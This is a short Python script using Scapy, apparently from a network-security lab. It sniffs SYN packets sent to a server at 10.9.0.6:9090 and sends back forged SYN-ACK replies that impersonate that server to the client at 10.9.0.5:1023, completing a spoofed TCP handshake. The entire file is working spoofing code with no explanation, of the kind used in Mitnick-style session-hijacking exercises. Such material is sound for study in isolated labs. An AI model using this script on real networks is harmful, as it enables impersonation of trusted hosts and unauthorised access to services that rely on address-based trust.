#!usr/bin/python3
from scapy.all import *
import sys

X_ip = "10.9.0.5"
X_port = 1023
srv_ip = "10.9.0.6"
srv_port = 9090

def spoof_pkt(pkt):
    sequence = 778933595
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]

    if old_tcp.flags == "S":           #if packet is SYN
        print("Sending spoofed SYN-ACK packet...")      #send spoofed SYN-ACK packet in response to SYN
        IPLayer = IP(src=srv_ip, dst=X_ip)
        TCPlayer = TCP(sport=srv_port, dport=X_port, flags="SA", seq=sequence, ack=old_tcp.seq + 1)
        pkt = IPLayer / TCPlayer
        send(pkt, verbose=0)


pkt = sniff(filter="tcp and host 10.9.0.6 and dst port 9090", prn=spoof_pkt)